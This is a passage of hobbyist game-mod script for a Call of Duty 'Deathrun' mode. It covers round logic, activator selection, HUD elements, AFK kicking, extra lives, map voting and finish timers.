        SetExpFog(256, 900, 0.4, 0.2, 0.2, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.4, 1, 1, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 0.6, 0, 0.4, 0.1); 
       wait .5; 
        SetExpFog(256, 900, 1, 0, 0.8, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 1, 1, 0, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.6, 1, 0.6, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 1, 0, 0, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0, 1, 0, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 0, 0, 1, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.4, 1, 0.8, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 0.8, 0, 0.6, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 1, 1, 0.6, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 1, 1, 1, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0, 0, 0.8, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.2, 1, 0.8, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 0.4, 0.4, 1, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0, 0, 0, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 0.4, 0.2, 0.2, 0.1); 
       wait .5; 
        SetExpFog(256, 900, 0.4, 1, 1, 0.1); 
        wait .5; 
        SetExpFog(256, 900, 0.6, 0, 0.4, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 1, 0, 0.8, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 1, 1, 0, 0.1); 
         wait .5; 
        SetExpFog(256, 900, 0.6, 1, 0.6, 0.1); 
	}
}

addTextHud( who, x, y, alpha, alignX, alignY, fontScale )
{
	if( isPlayer( who ) )
		hud = newClientHudElem( who );
	else
		hud = newHudElem();

	hud.x = x;
	hud.y = y;
	hud.alpha = alpha;
	hud.alignX = alignX;
	hud.alignY = alignY;
	hud.fontScale = fontScale;
	return hud;
}

endRoundAnnoucement( text, color )
{
	notifyData = spawnStruct();
	notifyData.titleText = text;
	notifyData.notifyText = ("Starting round ^3" + game["roundsplayed"] + "^7 out of ^3" + level.dvar["round_limit"] );
	//notifyData.iconName = "logo_brax";
	notifyData.glowColor = color;
	notifyData.duration = 8.8;

	players = getAllPlayers();
	for( i = 0; i < players.size; i++ )
		players[i] thread maps\mp\gametypes\_hud_message::notifyMessage( notifyData );
}

spawnSpectator( origin, angles )
{
	if( !isDefined( origin ) )
		origin = (0,0,0);
	if( !isDefined( angles ) )
		angles = (0,0,0);

	self notify( "joined_spectators" );

	self thread cleanUp();
	resettimeout();
	self.sessionstate = "spectator";
	self.spectatorclient = -1;
	self.statusicon = "";
	self spawn( origin, angles );
	self braxi\_teams::setSpectatePermissions();

	level notify( "player_spectator", self );
}

cleanUp()
{
	self clearLowerMessage();
	self notify( "kill afk monitor" );
	self setClientDvars( "cg_thirdperson", 0, "cg_thirdpersonrange", 80, "r_blur", 0, "ui_healthbar", 1, "bg_viewKickMax", 90, "bg_viewKickMin", 5, "bg_viewKickRandom", 0.4, "bg_viewKickScale", 0.2 );
	self unLink();

	self.bh = 0; 
	self.doingBH = false;
	self enableWeapons();

	if( isDefined( self.hud_freeround ) )		self.hud_freeround destroy();
	if( isDefined( self.hud_freeround_time ) )	self.hud_freeround_time destroy();
	if( isDefined( self.hud_time ) )			self.hud_time destroy();
}

gameLogic()
{
	level endon( "endround" );
	level endon( "kill logic" );
	waittillframeend;
	
	ambientStop(0);
	
	level.allowSpawn = true;
	warning = false;
	
	visionSetNaked( "mpIntro", 0 );
	if( isDefined( level.matchStartText ) )
		level.matchStartText destroyElem();

	wait 0.2;

	level.matchStartText = createServerFontString( "objective", 1.5 );
	level.matchStartText setPoint( "CENTER", "CENTER", 0, -20 );
	level.matchStartText.sort = 1001;
	level.matchStartText setText( level.text["waiting_for_players"] );
	level.matchStartText.foreground = false;
	level.matchStartText.hidewheninmenu = true;

	min = 2;
	if( level.freeRun )
		min = 1;

	waitForPlayers( min ); // wait for 2 players to start game

	roundStartTimer();
	
	if( !canStartRound( min ) )
	{
		thread restartLogic(); // lets start all over again...
		return;
	}

	level notify( "round_started", game["roundsplayed"] );
	level notify( "game started" );
	game["state"] = "playing";
	game["roundStarted"] = true;

	visionSetNaked( level.mapName, 2.0 );

	players = getAllPlayers();
	for( i = 0; i < players.size; i++ )
	{
		if( players[i] isPlaying() )
		{
			players[i] unLink();
			players[i] enableWeapons();
			players[i] thread antiAFK();
		}
	}
	
	if( level.freeRun )
	{
		level.hud_time setTimer( level.dvar["freerun_time"] );
		thread freeRunTimer();
		//iPrintlnBold( "^\A86>>^5Free" );

		thread drawInformation( 800, 2.5, 1, "" );
		thread drawInformation( 800, 2.5, -1, "FREE RUN" );
		return; //no logic in free run
	}
	else
	{
		level thread restrictSpawnAfterTime( level.dvar["spawn_time"] );
		level thread checkTimeLimit();

		level.hud_jumpers fadeOverTime( 2 );
		level.hud_jumpers.alpha = 1;
	}

	startJumpers = undefined;
	while( game["state"] == "playing" )
	{
		wait 0.2;

		level.jumper = [];
		level.jumpers = 0;
		level.activators = 0;
		level.totalPlayers = 0;
		level.totalPlayingPlayers = 0;

		players = getAllPlayers();
		if(players.size > 0)
		{
			for(i = 0; i < players.size; i++)
			{
				level.totalPlayers++;

				if( isDefined( players[i].pers["team"] ) )	
				{
					if( players[i] isReallyAlive() )
						level.totalPlayingPlayers++;

					if(players[i].pers["team"] == "allies" && players[i] isReallyAlive() )
					{
						level.jumpers++;
						level.jumper[level.jumper.size] = players[i];
					}
					if(players[i].pers["team"] == "axis" && players[i] isReallyAlive() )
						level.activators++;
				}
			}		
			
			if( !isDefined( startJumpers ) )
				startJumpers = level.jumpers;

			if( startJumpers >= 3 /*+1 cuz one is acti*/ && level.jumpers == 1 && !level.freeRun )
				level.jumper[0] thread lastJumper();

			if( level.jumpers > 1 && !level.activators && !level.activatorKilled && !level.freeRun )
			{
				
				if( !level.dvar["pickingsystem"] )
					pickRandomActivator();
				else
					NewPickingSystem();
				continue;
			}

			if( level.activators >= 2 && !warning )
			{
				warning( "level.activators >= 2 - report this to BraXi at www.braxi.cba.pl" );
				warning( "level.activators = " + level.activators );
				warning = true;
			}

			if( !level.jumpers && level.activators )
				thread endRound( "Jumpers died", "activators" );
			else if( !level.freeRun && !level.activators && level.jumpers )
				thread endRound( "Activator died", "jumpers" );
			else if( !level.activators && !level.jumpers )
				thread endRound( "Everyone died", "activators" );
		}
	}
}

pickRandomActivator()
{
	level notify( "picking activator" );
	level endon( "picking activator" );

	if( game["state"] != "playing" || level.activatorKilled || level.activators )
		return;

	players = getAllPlayers();
	if( !isDefined( players ) || isDefined( players ) && !players.size )
		return;

	num = randomInt( players.size );
	guy = players[num];

	if( level.dvar["dont_make_peoples_angry"] == 1 && guy getEntityNumber() == getDvarInt( "last_picked_player" ) )
	{	
		if( isDefined( players[num-1] ) && isPlayer( players[num-1] ) )
			guy = players[num-1];
		else if( isDefined( players[num+1] ) && isPlayer( players[num+1] ) )
			guy = players[num+1];
	}
	
	if( !isDefined( guy ) && !isPlayer( guy ) || level.dvar["dont_pick_spec"] && guy.sessionstate == "spectator" )
	{
		level thread pickRandomActivator();
		return;
	}

	bxLogPrint( ("A: " + guy.name + " ; guid: " + guy.guid) );
	iPrintlnBold( guy.name + "^5 was picked to be ^6Activator^2." );
		
	guy thread braxi\_teams::setTeam( "axis" );
	guy spawnPlayer();
	guy braxi\_rank::giveRankXp( "activator" );
		
	setDvar( "last_picked_player", guy getEntityNumber() );
	level notify( "activator", guy );
	level.activ = guy;
	wait 0.1;
	/*level thread pickRandomActivator2();*/
}
pickRandomActivator2()
{
	level notify( "picking activator" );
	level endon( "picking activator" );

	if( game["state"] != "playing" || level.activatorKilled || level.activators )
		return;

	players = getAllPlayers();
	if( !isDefined( players ) || isDefined( players ) && !players.size )
		return;

	num = randomInt( players.size );
	guy = players[num];

	if( level.dvar["dont_make_peoples_angry"] == 1 && guy getEntityNumber() == getDvarInt( "last_picked_player" ) )
	{	
		if( isDefined( players[num-1] ) && isPlayer( players[num-1] ) )
			guy = players[num-1];
		else if( isDefined( players[num+1] ) && isPlayer( players[num+1] ) )
			guy = players[num+1];
	}
	
	if( !isDefined( guy ) && !isPlayer( guy ) || level.dvar["dont_pick_spec"] && guy.sessionstate == "spectator" )
	{
		level thread pickRandomActivator();
		return;
	}

	bxLogPrint( ("A: " + guy.name + " ; guid: " + guy.guid) );
	iPrintlnBold( guy.name + "^3 was ^2picked to be ^1DOG!!." );
	 
	guy thread braxi\_teams::setTeam( "axis" );
	guy spawnPlayer();
	wait 5;
	guy setModel("german_sheperd_dog");
	guy setClientDvar( "cg_thirdperson", 1 );
	guy braxi\_rank::giveRankXp( "activator" );
    wait 0.5;
    guy takeAllWeapons();
    wait 0.5;
   guy GiveWeapon("dog_mp");
   wait 0.5;
   guy SwitchToWeapon("dog_mp");
		
	setDvar( "last_picked_player", guy getEntityNumber() );
	level notify( "activator", guy );
	level.activ = guy;
	wait 0.1;
}

checkTimeLimit()
{
	level endon( "endround" );
	level endon( "game over" );

	if( !level.dvar["time_limit"] )
		return;

	time = 60 * level.dvar["time_limit"];	
	countdown = level.hud_time setTimer ( time );
//	level.hud_time setText("^3Time left: ^7" +countdown);
	wait time;	
	level thread endRound( "Time limit reached", "activators" );
}

endMap( winningteam )
{
	game["state"] = "endmap";
	level notify( "intermission" );
	level notify( "game over" );

	setDvar( "g_deadChat", 1 );

	if( isDefined( level.hud_jumpers ) )
		level.hud_jumpers destroy();

	level.hud_round fadeOverTime( 2.6 );
//	self.killshud fadeoverTime( 2.6 );
//	self.deathshud fadeoverTime( 2.6 );
	level.nphud fadeoverTime( 2.6 );
//	self.killshud.alpha = 0;
//	self.deathshud.alpha = 0;
	level.nphud.alpha = 0;
	level.hud_round.alpha = 0;
	wait 3;
	level.hud_round destroy();
//	self.killshud destroy();
//	self.deathshud destroy();
	level.nphud destroy();
	
	
	
	//thread saveMapScores();

	level thread playSoundOnAllPlayers( "end_map" );

	players = getAllPlayers();
	for( i = 0; i < players.size; i++ )
	{
		players[i] closeMenu();
		players[i] closeInGameMenu();
		players[i] freezeControls( true );
		players[i] cleanUp();
		players[i] destroyLifeIcons();

//		players[i] setClientDvar( "cg_thirdpersonangle", randomInt(360), "cg_thirdpersonrange", 120 );
//		if( players[i].sessionstate != "spectator" )
//			players[i] setClientDvar( "cg_thirdperson", 0 );
//		else
//			players[i] setClientDvar( "cg_thirdperson", 0 );
	}
	wait .05;

	players = getAllPlayers();
	for( i = 0; i < players.size; i++ )
	{
		players[i] spawnSpectator( level.spawn["spectator"].origin, level.spawn["spectator"].angles );
		players[i] allowSpectateTeam( "allies", false );
		players[i] allowSpectateTeam( "axis", false );
		players[i] allowSpectateTeam( "freelook", false );
		players[i] allowSpectateTeam( "none", true );
	}

	if( level.dvar["displayBestPlayers"] )
		braxi\_scoreboard::showBestStats();

	saveMapScores();
	saveAllScores();

	wait 0.5;

	teddysOrigin = level.spawn["spectator"].origin + vector_scale( anglesToForward( level.spawn["spectator"].angles ), 120 ) + vector_scale( anglesToUp( level.spawn["spectator"].angles ), 180 );
	playFx( level.fx["falling_teddys"], teddysOrigin );
	playFx( level.fx["falling_teddys"], level.spawn["spectator"].origin + (0,0,100) );

	braxi\_mapvoting::startMapVote();
	braxi\_credits::main();
	
	players = getAllPlayers();
	for( i = 0; i < players.size; i++ )
	{
		players[i] spawnSpectator( level.spawn["spectator"].origin, level.spawn["spectator"].angles );
		players[i].sessionstate = "intermission";
	}
	wait 5;
	
	if( !level.dvar["mapvote"] )
		exitLevel( false );
	else
		braxi\_mapvoting::changeMap( braxi\_mapvoting::getWinningMap() );
}

respawn()
{
	self endon( "disconnect" );
	self endon( "spawned_player" );
	self endon( "joined_spectators" );

	if( level.freeRun || !game["roundStarted"] )
	{
		wait 0.1;
		self spawnPlayer();
		return;
	}

	if( self canSpawn() && self.pers["team"] == "allies" )
	{
		wait 0.5;

		if( game["state"] != "playing" )
			return;
		self setLowerMessage( &"PLATFORM_PRESS_TO_SPAWN" );
	
		while( !self useButtonPressed() )
			wait .05;

		if( game["state"] != "playing" )
			return;

		self thread useLife();
	}
}

antiAFK()
{
	self endon( "disconnect" );
	self endon( "spawned_player" );
	self endon( "joined_spectators" );
	self endon( "kill afk monitor" );

	if( !level.dvar["afk"] || self.pers["team"] == "axis" )
		return;

	time = 0;
	oldOrigin = self.origin - (0,0,50);
	while( isAlive( self ) )
	{
		wait 0.2;
		if( distance(oldOrigin, self.origin) <= 10 )
			time++;
		else
			time = 0;

		if( time == (level.dvar["afk_warn"]*5) )
		{
			if( level.dvar["afk_method"] )
				self iPrintlnBold( "You will be kicked from server due to AFK if you don't move" );
			else
				self iPrintlnBold( "^1Move ^3or ^1you ^3will ^1be ^3killed ^1due ^1to ^3AFK" );
		}

		if( time == (level.dvar["afk_time"]*5) )
		{
			if( level.dvar["afk_method"] )
			{
				iPrintln( self.name + " was kicked from server due to AFK." );
				self clientCmd( "disconnect" );
				//kick( self getEntityNumber() );
				self thread kickAfterTime( 2 );
			}
			else
			{
				iPrintln( self.name + " ^5was killed due to AFK." );
				self suicide();
			}
			break;
		}
		oldOrigin = self.origin;
	}
}

kickAfterTime( time )
{
	self endon( "disconnect" );
	wait time;

	if( isDefined( self ) )
		kick( self getEntityNumber() );
}

roundStartTimer()
{	
	
	if( isDefined( level.matchStartText ) )
		level.matchStartText destroyElem();

	level.matchStartText = createServerFontString( "objective", 1.5 );
	level.matchStartText setPoint( "CENTER", "CENTER", 0, -20 );
	level.matchStartText.sort = 1001;
	level.matchStartText setText( level.text["round_begins_in"] );
	level.matchStartText.foreground = false;
	level.matchStartText.hidewheninmenu = true;
	
	level.matchStartTimer = createServerTimer( "objective", 1.4 );
	level.matchStartTimer setPoint( "CENTER", "CENTER", 0, 0 );
	level.matchStartTimer setTimer( level.dvar["spawn_time"] );
	level.matchStartTimer.sort = 1001;
	level.matchStartTimer.foreground = false;
	level.matchStartTimer.hideWhenInMenu = true;
		
	wait level.dvar["spawn_time"];
	
	level.matchStartText destroyElem();
	level.matchStartTimer destroyElem();
}


GlowColors()
{
	colour = randomInt(20);
	switch(colour)
	{
		case 0:
			level.randomcolour = (1, 0, 0);
			break;
		case 1:
			level.randomcolour = (0.3, 0.6, 0.3);
			break;
		case 2:
			level.randomcolour = (0.602, 0, 0.563);
			break;
		case 3:
			level.randomcolour = (0.055, 0.746, 1);
			break;
		case 4:
			level.randomcolour = (0, 1, 0);
			break;
		case 5:
			level.randomcolour = (0.043, 0.203, 1);
			break;
		case 6:
			level.randomcolour = (0.5, 0.0, 0.8);
			break;
		case 7:
			level.randomcolour = (1.0, 0.0, 0.0);
			break;
		case 8:
			level.randomcolour = (0.9, 1.0, 0.0);
			break;
		case 9:
			level.randomcolour = (1.0, 0.0, 0.0);
			break;			
		case 10:
			level.randomcolour = (1.0, 0.0, 0.4);
			break;
		case 11:
			level.randomcolour = (1.0, 0.5, 0.0);
			break;
		case 12:
			level.randomcolour = (0.0, 0.5, 1.0);
			break;
		case 13:
			level.randomcolour = (0.5, 0.0, 0.8);
			break;
		case 14:
			level.randomcolour = (1.0, 0.0, 0.4);
			break;
		case 15:
			level.randomcolour = (0.0, 0.5, 1.0);
			break;
		case 16:
			level.randomcolour = (0.3, 0.0, 0.3);
			break;
		case 17:
			level.randomcolour = (0.0, 0.5, 1.0);
			break;	
		case 18:
			level.randomcolour = (0.5, 0.0, 0.2);
			break;
		case 19:
			level.randomcolour = (0.0, 1.0, 1.0);
			break;
		case 20:
			level.randomcolour = (0.0, 0.0, 1.0);
			break;
		case 21:
			level.randomcolour = (0.0, 1.0, 1.0);
			break;
		default: 
			level.randomcolour = (0.0, 0.0, 1.0);
			break;
	}
}
doHud()
{
	level endon( "intermission" );
	level thread GlowColors();
	
	level.hud_round = newHudElem();
    level.hud_round.foreground = true;
	level.hud_round.alignX = "right";
	level.hud_round.alignY = "top";
	level.hud_round.horzAlign = "right";
    level.hud_round.vertAlign = "top";
    level.hud_round.x = -5;
    level.hud_round.y = 17 + level.hudYOffset;
    level.hud_round.sort = 0;
  	level.hud_round.fontScale = 1.4;
	level.hud_round.color = (1, 1, 1);
	level.hud_round.font = "objective";
	level.hud_round.glowColor = level.randomcolour;
	level.hud_round.glowAlpha = 1;
//	level.hud_round SetPulseFX( 30, 100000, 700 );//something, decay start, decay duration
 	level.hud_round.hidewheninmenu = false;
	level.hud_round setText( "^3Round ^7" + game["roundsplayed"] + " ^3of ^7" + level.dvar["round_limit"] );
	
	level.hud_time = newHudElem();
    level.hud_time.foreground = true;
	level.hud_time.alignX = "right";
	level.hud_time.alignY = "top";
	level.hud_time.horzAlign = "right";
    level.hud_time.vertAlign = "top";
    level.hud_time.x = -5;
    level.hud_time.y = 32 + level.hudYOffset;
    level.hud_time.sort = 0;
  	level.hud_time.fontScale = 1.4;
	level.hud_time.color = (1, 1, 1);
	level.hud_time.font = "objective";
	level.hud_time.glowColor = level.randomcolour;
	level.hud_time.glowAlpha = 1;
 	level.hud_time.hidewheninmenu = false;
	self.hud_time.label = &"^3Time Left: ";
	//if( level.freeRun )
	//	return;
	if( !level.freeRun )
	{
		level.hud_jumpers = newHudElem();
		level.hud_jumpers.foreground = true;
		level.hud_jumpers.alignX = "right";
		level.hud_jumpers.alignY = "top";
		level.hud_jumpers.horzAlign = "right";
		level.hud_jumpers.vertAlign = "top";
		level.hud_jumpers.x = -3;
		level.hud_jumpers.y = 47 + level.hudYOffset;
		level.hud_jumpers.sort = 0;
		level.hud_jumpers.fontScale = 1.4;
		level.hud_jumpers.color = (1, 1.0, 1);
		level.hud_jumpers.font = "objective";
		level.hud_jumpers.glowColor = level.randomcolour;
		level.hud_jumpers.glowAlpha = 1;
		level.hud_jumpers.label = level.text["jumpers_count"];
		level.hud_jumpers.hidewheninmenu = false;
	}

	
	level.uhrzeit = newHudElem();
    level.uhrzeit.foreground = true;
	level.uhrzeit.alignX = "right";
	level.uhrzeit.alignY = "top";
	level.uhrzeit.horzAlign = "right";
    level.uhrzeit.vertAlign = "top";
    level.uhrzeit.x = -3;
    level.uhrzeit.y = 120 + level.hudYOffset;
    level.uhrzeit.sort = 0;
  	level.uhrzeit.fontScale = 1.4;
	level.uhrzeit.color = (1, 1.0, 1);
	level.uhrzeit.font = "objective";
	level.uhrzeit.glowColor = level.randomcolour;
	level.uhrzeit.glowAlpha = 1;
 	level.uhrzeit.hidewheninmenu = false;
	wait .05;

	while( 1 )
	{
		time = getDvar("time");
		level.uhrzeit setText( time );
		jumpers = level.jumpers;
		if(!isDefined (time))
			time = "N/A";
		if( !level.freeRun )
		{
			level.hud_jumpers setValue( level.jumpers );
			wait .05;
			while(time == getDvar("time") && jumpers == level.jumpers)
				wait .05;
		}
		else
			while(time == getDvar("time"))
				wait .05;
	}
}

updateHealthBar()
{
	self endon("disconnect");
	wait 0.1;
	self setClientDvar( "ui_healthbar", 1 );
	while( 1 )
	{
		self waittill ( "damage", amount );
		delta = ( self.health / self.maxhealth );
		if( delta > 1 )
			delta = 1;
		self setClientDvar( "ui_healthbar", delta+0.005 );
	}
}


freeRunChoice()
{
	self endon( "disconnect" );
	self endon( "spawned_player" );
	self endon( "joined_spectators" );
	self endon( "death" );

	if( !level.dvar["freeRunChoice"] || level.trapsDisabled )
		return;

	self.hud_freeround = newClientHudElem( self );
	self.hud_freeround.elemType = "font";
	self.hud_freeround.x = 320;
	self.hud_freeround.y = 370;
	self.hud_freeround.alignX = "center";
	self.hud_freeround.alignY = "middle";
	self.hud_freeround.alpha = 1;
	self.hud_freeround.font = "default";
	self.hud_freeround.fontScale = 1.8;
	self.hud_freeround.sort = 0;
	self.hud_freeround.foreground = true;
	self.hud_freeround.label = level.text["call_freeround"];

	self.hud_freeround_time = newClientHudElem( self );
	self.hud_freeround_time.elemType = "font";
	self.hud_freeround_time.x = 320;
	self.hud_freeround_time.y = 390;
	self.hud_freeround_time.alignX = "center";
	self.hud_freeround_time.alignY = "middle";
	self.hud_freeround_time.alpha = 1;
	self.hud_freeround_time.font = "default";
	self.hud_freeround_time.fontScale = 1.8;
	self.hud_freeround_time.sort = 0;
	self.hud_freeround_time.foreground = true;
	self.hud_freeround_time setTimer( level.dvar["freeRunChoiceTime"] );
	self.hud_freeround_time.glowColor = level.randomcolour;

	wait 1;
	freeRun = false;
	for( i = 0; i < 10*level.dvar["freeRunChoiceTime"]; i++ ) // time to switch into free run
	{
		if( !level.canCallFreeRun )
		{
			self.hud_freeround destroy();
			self.hud_freeround_time destroy();
			return;
		}
		if( self attackButtonPressed() )
		{
			freeRun = true;
			level endon( "kill_free_run_choice" );
			break;
		}
		wait 0.1;
	}
	level endon( "kill_free_run_choice" );


	if( isDefined( self.hud_freeround ) )
		self.hud_freeround destroy();
	if( isDefined( self.hud_freeround_time ) )
		self.hud_freeround_time destroy();

	if( freeRun )
	{
		thread drawInformation( 800, 0.8, 1, "FREE RUN" );
		thread drawInformation( 800, 0.8, -1, "FREE RUN" );

		level disableTraps();
		players = getAllPlayers();
		level notify( "round_freerun" );
	}
}

disableTraps()
{
	level.trapsDisabled = true;
	for( i = 0; i < level.trapTriggers.size; i++ )
		if( isDefined( level.trapTriggers[i] ) )
			level.trapTriggers[i].origin = level.trapTriggers[i].origin - (0,0,10000);
	level notify( "traps_disabled" ); //for mappers
}

serverMessages()
{
	low = game["roundsplayed"];
	if( low == 2 || low == 4 ||low == 6 ||low == 8 ||low == 10 ||low == 11 || low == 13 || low == 15 || low >= 17)
		return;
	rules = strTok(getDvar("dr_messages"), ";");
	rule = [];
	time = randomInt(30);
	wait time;
	wait 20;
	intro = addTextHud( level, 320, 10, 0, "center", "middle", 2 );		
	intro SetText(rules[0]);
	intro FadeOverTime(1);
	intro.alpha = 1;
	wait 1.5;
	intro FadeOverTime(1.9);
	intro.alpha = 0;
	for(i=1;i<rules.size;i++)
	{
		rule[i] = addTextHud( level, 940, 10, 1, "center", "middle", 1.6 );		
		rule[i] SetText(rules[i]);
		rule[i] MoveTo(1.6,620);
		wait 1.65;
		if(isDefined(rule[i-1]))
			rule[i-1] destroy();
		rule[i] MoveTo(4,20);
		wait 4;
		rule[i] MoveTo(1.5,-400);			
	}
	
	if(isdefined(intro))
		intro destroy();	
	if(isDefined(rule[rules.size]))
		rule[rules.size] destroy();		
}



isWallKnifing( attacker, victim )
{
	start = attacker getEye();
	end = victim getEye();

	if( bulletTracePassed( start, end, false, attacker ) == 1 )
	{
		return false;
	}
	return true;
}



NewPickingSystem()
{
//
// How it works:
// 1. Build array of players that have lowest number of being activator (starting from 0)
// 2. Check if we got some players in array
//		a) If array size is -1 increase startValue and go back to step 1
//		b) Array size is okey lets go to step 3
// 3. Now pick random player from array to be Activator
//

	level notify( "picking activator" );
	level endon( "picking activator" );

	if( game["state"] != "playing" || level.activatorKilled || level.activators )
		return;

	players = getAllPlayers();
	if( !isDefined( players ) || isDefined( players ) && !players.size )
		return;

	startValue = 0;
	goodPlayers = [];

	while( 1 )
	{
		allPlayers = getAllPlayers();
		for( i = 0; i < allPlayers.size; i++ )
		{
			if( level.dvar["dont_pick_spec"] && allPlayers[i].sessionstate == "spectator" )
			{
				i++;
				continue;
			}
			if ( allPlayers[i].pers["activator"] == startValue )
				goodPlayers[goodPlayers.size] = allPlayers[i];
			i++;
		}

		if( !goodPlayers.size )
		{
			startValue++;
			if( players.size >= 15 )
				wait 0.05; // dont want 'infinite loop' error here
			continue;
		}
		break;
	}
	
	level.activ = goodPlayers[ randomInt( goodPlayers.size ) ];
	level.activ.pers["activator"]++;

	level.activ thread braxi\_teams::setTeam( "axis" );
	level.activ spawnPlayer();
	level.activ thread braxi\_rank::giveRankXp( "activator" );

	level notify( "activator", level.activ );

	bxLogPrint( ("A: " + level.activ.name + " ; guid: " + level.activ.guid) );
	iPrintlnBold( level.activ.name + " ^7was picked to be ^1Activator" );
}


new_ending_hud( align, fade_in_time, x_off, y_off )
{
	hud = newHudElem();
    hud.foreground = true;
	hud.x = x_off;
	hud.y = y_off;
	hud.alignX = align;
	hud.alignY = "middle";
	hud.horzAlign = align;
	hud.vertAlign = "middle";

 	hud.fontScale = 3;

	hud.color = (0.8, 1.0, 0.8);
	hud.font = "objective";
	hud.glowColor = (0.3, 0.6, 0.3);
	hud.glowAlpha = 1;

	hud.alpha = 0;
	hud fadeovertime( fade_in_time );
	hud.alpha = 1;
	hud.hidewheninmenu = true;
	hud.sort = 10;
	return hud;
}


drawInformation( start_offset, movetime, mult, text )
{
	start_offset *= mult;
	hud = new_ending_hud( "center", 0.1, start_offset, 90 );
	hud setText( text );
	hud moveOverTime( movetime );
	hud.x = 0;
	hud.glowColor = level.randomcolour;
	hud.font = "objective";
	wait( movetime );
	wait( 3 );
	hud moveOverTime( movetime );
	hud.x = start_offset * -1;

	wait movetime;
	hud destroy();
}

SetupLives()
{
	self endon( "disconnect" );

	self.hud_lifes = []; // hud elems array
	
	self addLifeIcon( 0, 16, 94, -18, 10 );
	self addLifeIcon( 1, 16, 94, -18, 10 );
	self addLifeIcon( 2, 16, 94, -18, 10 );

	wait .05;
	
	if( !self.pers["lifes"] )
		return;

	for( i = 0; i != self.pers["lifes"]; i++ )
	{
		self.hud_lifes[i] showLifeIcon();
	}
}

giveLife()
{
	if( self.pers["lifes"] >= 3 )
		return; 

	self.pers["lifes"]++;

	// hud stuff;
	hud = self.hud_lifes[ self.pers["lifes"]-1 ];
	hud showLifeIcon();

	hud SetPulseFX( 30, 100000, 700 );
	//self iprintlnBold( "^6>>^5You Earned Additional Life^6<<" );
}

showLifeIcon()
{
	self fadeOverTime( 1 );
	self.alpha = 1;
	self.glowAlpha = 1;
	self.color = level.color_cool_green;
}

useLife()
{
	if( !self.pers["lifes"] || self.sessionstate == "playing" || !level.dvar["allowLifes"] )
		return; 

	hud = self.hud_lifes[ self.pers["lifes"]-1 ];
	hud fadeOverTime( 1 );
	hud.alpha = 0;
	hud.glowAlpha = 0;
	//hud.color = level.color_cool_green;

	self.pers["lifes"]--;

	if( !self.pers["lifes"] )
		self iPrintlnBold( "^6>>^5This was your Last Life, don't Waste it^6<<" );
	else
		self iprintlnBold( "^2>>^3You Used One of Your Additional Lifes^2<<" );

	if( level.dvar["insertion"] && isDefined( self.insertion ) )
	{
		self spawnPlayer( self.insertion.origin, (0,self.insertion.angles[1],0) );
	}
	else
		self spawnPlayer();

	self.usedLife = true;
}


addLifeIcon( num, x, y, offset, sort )
{

	hud = newClientHudElem( self );
    hud.foreground = true;
	hud.x = x + num * offset;
	hud.y = y + level.hudYOffset;
	hud setShader( "stance_stand", 64, 64 );
	hud.alignX = "right";
	hud.alignY = "top";
	hud.horzAlign = "right";
	hud.vertAlign = "top";
	hud.sort = sort;
	hud.color = level.color_cool_green;
	hud.glowColor = level.color_cool_green_glow;
	hud.glowAlpha = 0;
	hud.alpha = 0;
 	hud.hidewheninmenu = true;
 	self.hud_lifes[num] = hud;
}

destroyLifeIcons()
{
	if( !isDefined( self.hud_lifes ) )
		return;
	for( i = 0; i < self.hud_lifes.size; i++ )
		if( isDefined( self.hud_lifes[i] ) )
			self.hud_lifes[i] destroy();
}

gib_splat()
{
	//self hide();
	self playSound( "gib_splat" );
	playFx( level.fx["gib_splat"], self.origin + (0,0,20) );
	self delete();
}


fastestTime()
{
	trig = getEntArray( "endmap_trig", "targetname" );
	if( !trig.size || trig.size > 1 )
		return;

	level.mapHasTimeTrigger = true;

	trig = trig[0];
	while( 1 )
	{
		trig waittill( "trigger", user );

		if( !user isReallyAlive() || user.pers["team"] == "axis" )
			continue;

		user thread endTimer();
	}
}



endTimer()
{
	if( isDefined( self.finishedMap ) )
		return;

	self.finishedMap = true;

	time = (getTime() - self.timerStartTime) / 1000;

	self.hud_time destroy();
	self.hud_time = addTextHud( self, 627, -235, 1, "left", "bottom", 2.0 );
    self.hud_time.foreground = true;
	self.hud_time.alignX = "right";
	self.hud_time.alignY = "top";
	self.hud_time.horzAlign = "right";
    self.hud_time.vertAlign = "top";
    self.hud_time.x = -3;
    self.hud_time.y = 105 + level.hudYOffset;
    self.hud_time.sort = 0;
  	self.hud_time.fontScale = 1.4;
	self.hud_time.color = (1, 1.0, 1);
	self.hud_time.font = "objective";
	self.hud_time.glowColor = level.randomcolour;
	self.hud_time.glowAlpha = 1;
 	self.hud_time.hidewheninmenu = false;

	//self.hud_time reset();
	self.hud_time setText( "^3Your time: ^7" + time );

	self iPrintlnBold( "You've finished map in ^2" + time + " ^7seconds" );

	if( time < self.pers["time"] )
		self.pers["time"] = time;
}

playerTimer()
{
	self endon( "disconnect" );
	self endon( "spawned_player" );
	self endon( "joined_spectators" );
	self endon( "death" );

	if( !level.mapHasTimeTrigger || isDefined( self.finishedMap ) || self.pers["team"] == "axis" )
		return;

	while( game["state"] != "playing"  )
		wait 0.05;

	//self.hud_time.horzAlign = "fullscreen";
    //self.hud_time.vertAlign = "fullscreen";

	
	self.hud_time = addTextHud( self, 627, -235, 1, "left", "bottom", 2.0 );
	self.hud_time.foreground = true;
	self.hud_time.alignX = "right";
	self.hud_time.alignY = "top";
	self.hud_time.horzAlign = "right";
    self.hud_time.vertAlign = "top";
    self.hud_time.x = -3;
    self.hud_time.y = 105 + level.hudYOffset;
    self.hud_time.sort = 0;
  	self.hud_time.fontScale = 1.4;
	self.hud_time.color = (1, 1.0, 1);
	self.hud_time.font = "objective";
	self.hud_time.glowColor = level.randomcolour;
	self.hud_time.glowAlpha = 1;
 	self.hud_time.hidewheninmenu = false;
